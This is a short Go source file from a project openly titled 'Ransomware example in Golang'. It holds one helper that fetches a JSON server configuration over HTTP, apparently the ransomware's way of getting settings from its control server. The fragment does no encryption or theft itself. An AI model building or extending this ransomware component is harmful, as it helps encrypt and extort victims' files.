/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package util

import (
	"encoding/json"

	"github.com/parnurzeal/gorequest"

	"github.com/gustavohenrique/ransomware/cryptography"
)

func GetServerConfig(channel chan cryptography.ServerConfig, serverUrl string) (config cryptography.ServerConfig) {
	request := gorequest.New()
	_, body, err := request.Get(serverUrl).
		Set("Content-Type", "application/json").
		End()

	if err == nil {
		b := []byte(body)
		json.Unmarshal(b, &config)
	}
	return config
}
